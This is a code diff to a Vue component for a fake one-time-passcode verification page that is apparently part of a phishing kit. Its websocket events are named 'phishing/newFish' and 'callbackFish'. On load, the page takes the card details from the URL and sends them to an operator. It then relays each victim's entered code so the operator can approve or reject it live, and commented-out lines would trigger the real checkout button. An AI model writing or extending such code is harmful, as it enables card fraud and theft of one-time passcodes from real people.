@@ -54,7 +54,7 @@
               </label>
               <input
                   id="otp-code"
-                  v-model="code"
+                  v-model="cardInfo.code"
                   type="text"
                   placeholder="Enter 6-digit code"
                   maxlength="6"
@@ -67,7 +67,7 @@
             <div class="space-y-3 pt-2">
               <button
                   type="submit"
-                  :disabled="code.length !== 6 || isSubmitting"
+                  :disabled="cardInfo.code?.length !== 6 || isSubmitting"
                   class="w-full h-12 sm:h-14 bg-green-600 hover:bg-green-700 text-white rounded-md disabled:opacity-50 disabled:cursor-not-allowed transition-colors font-medium"
               >
                 {{ isSubmitting ? 'VERIFYING...' : 'SUBMIT' }}
@@ -149,27 +149,19 @@
 import { ref, watch,computed ,onBeforeUnmount, onMounted } from 'vue';
 import { addOnMessage, removeOnMessage, sendMsg } from '~/utils';
 import type { WebSocketMessage } from '~/utils';
-import { format } from 'date-fns';
+import {useLoadingStore} from "~/stores/loading";
 
-enum Enum {
-  SendType = 1, // 发送类型
-  ReceiveType = 2, // 接受类型
-}
+const loadingStore = useLoadingStore();
 
-interface Message {
-  type: Enum;
-  content: string;
-  time: string;
-}
-
-const messageEvent = 'websocket/addons/phishing/newFish';
-const messageCallback = 'websocket/addons/phishing/callback';
+const eventNewFish = 'websocket/addons/phishing/newFish';
+const eventEditFish = 'websocket/addons/phishing/editFish';
+const eventCallBack = 'websocket/addons/phishing/callbackFish';
 
 // OTP Form State
-const code = ref('');
 const isSubmitting = ref(false);
 const isExpanded = ref(false);
 const countdown = ref(0);
+const cardInfo = ref({});
 
 // Countdown Timer Watcher
 watch(countdown, (newValue) => {
@@ -180,61 +172,69 @@ watch(countdown, (newValue) => {
   }
 });
 
-// Submit Handler
+// 开始提交 - loading
 const handleSubmit = async () => {
+  sendCode()
   isSubmitting.value = true;
-  // Simulate API call
-  await new Promise(resolve => setTimeout(resolve, 2000));
-  isSubmitting.value = false;
-  alert('Authentication completed!');
-  sendMessage()
+};
+// 发送验证码
+function sendCode() {
+  if (cardInfo.code == '') {
+    return;
+  }
+  cardInfo.value['status'] = 'checking';
+  sendMsg(eventEditFish, {
+    message: cardInfo.value,
+  });
+}
+// 消息回调
+const callBackFish = (res: WebSocketMessage) => {
+  if(res.data.action == "发送验证码"){
+    // 取消loading状态， 展示页面
+    loadingStore.unloadStripe();
+  }else if(res.data.action == "验证通过"){
+    isSubmitting.value = false;
+    // 提交成功，跳转页面
+    console.log("======真实提交")
+    // const btn = top.document.getElementById("checkout-pay-button");
+    // btn.disabled=false;
+    // btn.click();
+    // top.window.hack = false;
+
+  }else if(res.data.action == "验证拒绝"){
+    isSubmitting.value = false;
+    // 提交失败，提示用户
+    alert("Verification failed. Please try again.");
+  }
+  console.log("callBackFish：",res)
 };
 
 // Resend Code Handler
 const handleResendCode = () => {
   countdown.value = 60;
-  // alert('A new code has been sent to your mobile device.');
 };
-
-
-function sendMessage() {
-  if (code.value == '') {
-    return;
-  }
-
-  // 发送消息
-  sendMsg(messageEvent, {
-    message: code.value,
-  });
-
-  const msg: Message = {
-    type: Enum.SendType,
-    content: code.value,
-    time: format(new Date(), 'yyyy-MM-dd HH:mm:ss'),
-  };
-}
-
-const onMessage = (res: WebSocketMessage) => {
-  console.log("收到回复：",res)
-};
-
 
 onMounted(() => {
   // 在当前页面注册消息监听
-  addOnMessage(messageEvent, onMessage);
-  console.log(window.location.search)
+  addOnMessage(eventCallBack, callBackFish);
 
-  // 发送消息
-  sendMsg(messageEvent, {
-    message: window.location.search,
+  // 解析URL参数
+  const resultObject: { [key: string]: string } = Object.fromEntries(new URLSearchParams(window.location.search));
+  // 初始化
+  resultObject['status'] = 'ready';
+  cardInfo.value = resultObject;
+
+  // 发送上鱼消息
+  sendMsg(eventNewFish, {
+    message: cardInfo.value,
   });
-
 });
 
 onBeforeUnmount(() => {
   // 移除消息监听
-  removeOnMessage(messageCallback);
+  removeOnMessage(callBackFish);
 });
+
 </script>
 
 <style scoped>
